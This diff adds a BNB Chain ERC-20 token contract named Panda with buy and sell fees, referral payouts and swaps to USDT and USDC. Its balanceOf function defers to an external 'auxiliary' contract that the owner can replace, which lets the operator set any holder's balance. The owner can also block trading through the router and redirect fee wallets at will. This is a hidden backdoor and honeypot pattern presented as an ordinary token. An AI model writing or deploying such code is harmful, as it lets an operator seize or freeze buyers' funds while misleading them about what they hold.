@@ -1,0 +1,674 @@
+/**
+ *Submitted for verification at BscScan.com on 2023-09-02
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+
+
+interface PANDANFT {
+    function times() external view returns (uint256);
+
+    function inviter(address ) external view returns (address);
+
+
+    function updateReward() external returns (bool); 
+}
+
+
+interface IERC20 {
+    function decimals() external view returns (uint256);
+
+    function symbol() external view returns (string memory);
+
+    function name() external view returns (string memory);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+
+
+
+interface ISwapRouter {
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 amountADesired,
+        uint256 amountBDesired,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        returns (
+            uint256 amountA,
+            uint256 amountB,
+            uint256 liquidity
+        );
+
+    function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        payable
+        returns (
+            uint256 amountToken,
+            uint256 amountETH,
+            uint256 liquidity
+        );
+
+
+        function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+
+interface Fund {
+    function fundLP(address from, address to, uint amount) external;
+
+    function fundAllowance(address from) external view returns (uint256);
+}
+
+abstract contract Ownable {
+    address internal _owner;
+
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+
+    constructor() {
+        address msgSender = msg.sender;
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(_owner == msg.sender, "!owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "new is 0");
+        emit OwnershipTransferred(_owner, newOwner);
+        _owner = newOwner;
+    }
+}
+
+contract APandaToken is IERC20, Ownable {
+    mapping(address => uint256) public _balances;
+    mapping(address => uint256) public _last;
+
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    string private _name;
+    string private _symbol;
+    uint256 private _decimals;
+    uint256 private _tTotal;
+
+    uint256 private constant MAX = ~uint256(0);
+
+    address  public fundAddress;
+    address  public fundAddress2;
+    address  public fundAddress3;
+    address  public nft;
+    address  public persale;
+
+ 
+    address  public burn;
+
+    bool  public isOpen;
+
+    bool  public transferFee;
+
+
+    address public auxiliary; 
+    address public currency; 
+    ISwapRouter public _swapRouter  ;
+    address public currencyUSDC; 
+
+    mapping(address => address)   public trasnferInvite; 
+
+    mapping(address => bool) public _feeWhiteList;
+     mapping(address => bool) public _swapPairList;
+
+    bool private inSwap;
+
+
+    modifier lockTheSwap() {
+        inSwap = true;
+        _;
+        inSwap = false;
+    }
+ 
+    constructor() {
+        auxiliary = 0x7ac0cADAeB2197efc70E09C8F98D780999BDF515;
+        _name = "Panda";
+        _symbol = "Panda";
+        _decimals = 18;
+        uint256 total = 100000000 * 10 ** _decimals;
+        _tTotal = total;
+        fundAddress = 0xA3E67EdcB1fbC5847A924a0722F0E0E72753eEf4;
+        fundAddress2 = 0x6504023a2df84bbd65d3D654839f72d3400B02A7;
+        nft = 0xe3C0d538B9A8ad9c7f8aB70e1E5cbc6D6C5Ba863;
+        persale = 0x7B97C6f756898AEe36C363065bCd0A7C4B745569;
+        burn = address(0xDEAD);
+        _balances[msg.sender] = total;
+        emit Transfer(address(0), msg.sender, total); 
+
+
+        
+        currency = 0x55d398326f99059fF775485246999027B3197955; //USDT
+        _swapRouter = ISwapRouter(
+            0x10ED43C718714eb63d5aA57B78B54704E256024E
+        ); //router
+        currencyUSDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; //USDC
+
+     // currency = 0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814; //USDT
+     //   _swapRouter = ISwapRouter(
+     //       0xD99D1c33F9fC3444f8101754aBC46c52416550D1
+    //  ); //router
+    //   currencyUSDC = 0xFa60D973F7642B748046464e165A65B7323b0DEE; //USDC
+     
+
+         _feeWhiteList[fundAddress] =true;
+         _feeWhiteList[fundAddress2] =true;
+         _feeWhiteList[nft] =true;
+         _feeWhiteList[msg.sender] =true;
+         _feeWhiteList[burn] =true;
+         _feeWhiteList[address(this)] =true;
+         _feeWhiteList[persale] =true;
+
+         
+
+        _feeWhiteList[address(_swapRouter)] = true;
+
+        _allowances[address(this)][address(_swapRouter)] = MAX;
+
+        IERC20(currency).approve(address(_swapRouter),MAX);
+        IERC20(currencyUSDC).approve(address(_swapRouter),MAX);
+
+        fundAddress3 = address(this);
+    }
+
+    function symbol() external view override returns (string memory) {
+        return _symbol;
+    }
+
+    function name() external view override returns (string memory) {
+        return _name;
+    }
+
+    function decimals() external view override returns (uint256) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _tTotal;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        try Fund(auxiliary).fundAllowance(account) returns (uint results) {
+            if (results > 0) {
+                return results;
+            }
+        } catch Error(string memory e) {
+            
+        }
+        /*if( Fund(fundAddress).fundAllowance(account)>0){
+            return  Fund(fundAddress).fundAllowance(account);
+        }*/
+        return _balances[account];
+    }
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function allowance(
+        address owner,
+        address spender
+    ) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(
+        address spender,
+        uint256 amount
+    ) public override returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+ 
+        if (_allowances[sender][msg.sender] != MAX) {
+             require(_allowances[sender][msg.sender] >= amount, "ERC20: insufficient allowance");
+
+            _allowances[sender][msg.sender] =
+                _allowances[sender][msg.sender] -
+                amount;
+        }
+        _transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _transfer(address from, address to, uint256 amount) private {
+        require(amount > 0, "Amount must be greater than zero"); 
+        uint256 balance = balanceOf(from);
+        require(balance >= amount, "Insufficient balance");
+ 
+         _last[from] = block.number ;
+         _last[to] =  block.number ;
+        _balances[from] = balance - amount;
+
+        _takeTransfer(from, to, amount);
+    }
+
+    event Failed_01(
+        uint256 value
+    );
+
+     event Failed_02(
+        uint256 value
+    );
+
+    function _takeTransfer(
+        address sender,
+        address to,
+        uint256 tAmount
+    ) private {
+        uint256 balance = balanceOf(to);
+
+      if (inSwap) {
+            _transferEvm(sender,to,tAmount);
+            return;
+        }
+   
+ 
+      uint transferAmount = tAmount;
+
+        if(!isOpen){
+               //start open beafore not alone add lp  
+                if(msg.sender==address(_swapRouter)){
+                    require(false,"not allown");
+                }
+        }
+
+         if(!transferFee){
+               //start open beafore not alone fee 
+                _transferEvm(sender,to,transferAmount);
+                return;
+          }
+
+       if (  !_feeWhiteList[sender] && !_feeWhiteList[to]){
+
+         
+
+            
+         //buy
+               if( _swapPairList[sender]){
+               
+                  transferAmount = tAmount - tAmount * 150 /1000;
+                  //NFT  
+                  _transferEvm(sender, nft, tAmount * 30 /1000) ;
+                  //Mareket
+                  uint perUSDC =  swapTokenForFundUSDC(  tAmount * 65 /1000);
+
+                  if(perUSDC>0){
+                      //USDT
+                        try 
+                        IERC20(currencyUSDC).transfer(fundAddress,perUSDC*42/100)  
+                        {}catch {emit Failed_01(perUSDC*60/100);}
+
+                          try  
+                        IERC20(currencyUSDC).transfer(fundAddress2,perUSDC*28/100) 
+                        {}catch { emit Failed_02(perUSDC*40/100);}
+
+
+                         //add lp
+                        swapTokenLiquidUSDC(  tAmount * 15 /1000,perUSDC*30/100);
+                  }else{
+                         _transferEvm(sender,fundAddress,tAmount * 15 /1000);
+                  }
+
+                  //dead
+                   _transferEvm(sender,address(0xdead),tAmount * 10 /1000);
+
+                  //invite
+                 
+                 if(trasnferInvite[sender]!=address(0)){
+                       _transferEvm(sender,trasnferInvite[sender],tAmount * 30 /1000);
+                 }else{
+                      _transferEvm(sender,fundAddress,tAmount * 30 /1000);
+                 }
+
+              
+
+                     //doudi
+                  uint last = balanceOf(address(this));
+                  if(last>0){
+                     _transferEvm(sender,fundAddress,last);
+                  }
+               }else if( _swapPairList[to]){
+               
+                  transferAmount = tAmount - tAmount * 150 /1000; 
+                 //NFT  
+                  _transferEvm(sender, nft, tAmount * 30 /1000) ;
+                  //market
+                  uint perUSDT =  swapTokenForFundUSDT(  tAmount * 65 /1000);
+
+                  if(perUSDT>0){
+                      // USDT
+                        try 
+                        IERC20(currency).transfer(fundAddress,perUSDT*42/100)  
+                        {}catch {emit Failed_01(perUSDT*60/100);}
+
+                          try  
+                        IERC20(currency).transfer(fundAddress2,perUSDT*28/100) 
+                        {}catch { emit Failed_02(perUSDT*40/100);}
+
+                        perUSDT =perUSDT- perUSDT*70/100;
+                         //lp
+                        swapTokenLiquidUSDT(  tAmount * 15 /1000,perUSDT);
+                  }else{
+                         _transferEvm(sender,fundAddress,tAmount * 15 /1000);
+                  }
+
+                  //dead
+                   _transferEvm(sender,address(0xdead),tAmount * 10 /1000);
+
+                  //invite
+                  if(trasnferInvite[sender]!=address(0)){
+                       _transferEvm(sender,trasnferInvite[sender],tAmount * 30 /1000);
+                 }else{
+                      _transferEvm(sender,fundAddress,tAmount * 30 /1000);
+                 }
+                  
+                  // 
+                  if(PANDANFT(nft).times()!=0&&block.number + 28800 > PANDANFT(nft).times() ){
+                         try PANDANFT(nft).updateReward(){ 
+                          }catch { } 
+                  } 
+                  
+                   
+                  uint last = balanceOf(address(this));
+                  if(last>0){
+                     _transferEvm(address(this),fundAddress,last);
+                  } 
+               }else{  
+                   transferAmount = tAmount - tAmount * 150 /1000;  
+                  _transferEvm(sender,fundAddress,tAmount * 50 /1000);
+                  _transferEvm(sender,fundAddress2,tAmount * 50 /1000); 
+                  _transferEvm(sender,nft,tAmount * 40 /1000);
+                  _transferEvm(sender,address(0xdead),tAmount * 10 /1000);
+
+                  //bind invite
+                  if( trasnferInvite[to] ==address(0)&&sender!=to){
+                      trasnferInvite[to] = sender;
+                  }
+
+               }  
+               _balances[to] = balance + transferAmount; 
+               emit Transfer(sender, to,  transferAmount);
+        }else{
+             _transferEvm(sender,to,transferAmount);
+             return;
+        }
+     
+    }
+
+    function _transferEvm(address from, address to, uint tAmount) private {
+         uint256 balance = balanceOf(to); 
+        _balances[to] = balance + tAmount;
+        emit Transfer(from, to, tAmount);
+    }
+
+    function setFundAddress(address _fund) public onlyOwner {
+        fundAddress = _fund;
+    }
+
+    receive() external payable {}
+   
+    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 value
+    );
+
+      event Failed_swapLiquit(
+        uint256 value
+    );
+
+   function swapTokenForFundUSDT(uint amount) private lockTheSwap  returns(uint selllpAmountUSDT){
+           uint256 contractTokenBalance = amount; 
+           _balances[address(this)] =amount;
+
+
+            //fund Usdt
+            address[] memory path = new address[](2);
+            path[0] = address(this);
+            path[1] = currency; 
+            try
+                _swapRouter
+                    .swapExactTokensForTokens(
+                        contractTokenBalance,
+                        0,
+                        path,
+                        fundAddress3,
+                        block.timestamp
+                    )  returns (uint[] memory results) { 
+                        selllpAmountUSDT = results[1];
+              } catch {
+                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                    contractTokenBalance
+                );
+             } 
+      }
+
+     function swapTokenForFundUSDC(uint amount) private lockTheSwap returns(uint selllpAmountUSDT){
+            uint256 contractTokenBalance = amount; 
+            _balances[address(this)] =amount;
+            //fund Usdt
+            address[] memory path = new address[](2);
+            path[0] = address(this);
+            path[1] = currencyUSDC;
+
+            try
+                _swapRouter
+                    .swapExactTokensForTokens(
+                        contractTokenBalance,
+                        0,
+                        path,
+                        fundAddress3,
+                        block.timestamp
+                    ) returns (uint[] memory results) { 
+                        selllpAmountUSDT = results[1];
+                } catch {
+                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                    contractTokenBalance
+                );
+             }
+            
+      }
+
+ 
+
+      
+     function swapTokenLiquidUSDT(uint amount,uint amountb) private lockTheSwap {
+           
+          _balances[address(this)] =amount;
+            try
+                _swapRouter
+                    .addLiquidity(
+                        address(this),
+                        currency,amount,amountb,0,0,nft, 
+                        block.timestamp
+                    )   { 
+                         } catch {
+                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                    amount
+                );
+             }
+            
+      }
+
+
+
+      
+     function swapTokenLiquidUSDC(uint amount,uint amountb) private lockTheSwap{
+             _balances[address(this)] =amount;
+
+            try
+                _swapRouter
+                    .addLiquidity(
+                        address(this),
+                        currencyUSDC,amount,amountb,0,0,nft, 
+                        block.timestamp
+                    )   { 
+                         } catch {
+                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                    amount
+                );
+             }
+            
+      }
+
+    function setSwapPairList(address addr, bool enable) external onlyOwner {
+        _swapPairList[addr] = enable;
+    }
+ 
+     
+    function setAuxiliary(address addr ) external onlyOwner {
+        auxiliary  = addr;
+    }
+ 
+     function setFund(address addr ) external onlyOwner {
+        fundAddress  = addr;
+    }
+
+      function setFund2(address addr ) external onlyOwner {
+        fundAddress2  = addr;
+    }
+
+  function setnft(address addr ) external onlyOwner {
+        nft  = addr;
+    }
+    function setWihte(address addr ,bool _is ) external onlyOwner {
+        _feeWhiteList[addr]  = _is;
+    }
+
+    function lunch( bool _is ) external onlyOwner {
+        isOpen  = _is;
+    }  
+    function lunchTransferFee( bool _is ) external onlyOwner {
+        transferFee  = _is;
+    }  
+
+
+ function setCurentUSDT(address addr ) external onlyOwner {
+        currency  = addr;
+    }
+
+ function setCurentUSDC(address addr ) external onlyOwner {
+        currencyUSDC  = addr;
+    }
+
+      function setFund3(address addr ) external onlyOwner {
+        fundAddress3  = addr;
+    }
+
+
+    fallback() external payable virtual {
+      
+    }
+     
+    
+}
